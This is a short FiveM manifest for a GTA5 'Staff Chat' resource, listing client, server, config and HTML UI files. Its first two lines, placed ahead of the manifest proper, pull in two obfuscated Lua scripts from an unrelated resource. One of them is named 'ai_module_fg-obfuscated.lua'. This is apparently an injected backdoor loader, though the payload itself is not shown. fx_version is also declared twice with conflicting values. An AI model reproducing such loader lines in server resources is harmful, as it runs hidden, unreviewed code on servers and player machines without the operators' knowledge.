shared_script '@ulasdmrc/shared_fg-obfuscated.lua'
shared_script '@ulasdmrc/ai_module_fg-obfuscated.lua'

 
fx_version 'cerulean'
game 'gta5'
author 'InDream#9996'
description 'Staff Chat'
fx_version '1.0'
client_scripts {
	"client/*",
}
server_scripts {
	"server/*",
}
shared_scripts {
    'config.lua'
}
ui_page 'html/index.html'
files {
	'html/index.html',
	'html/style.css',
	'html/app.js',
	'html/sounds/select.wav'
}
lua54 'yes'
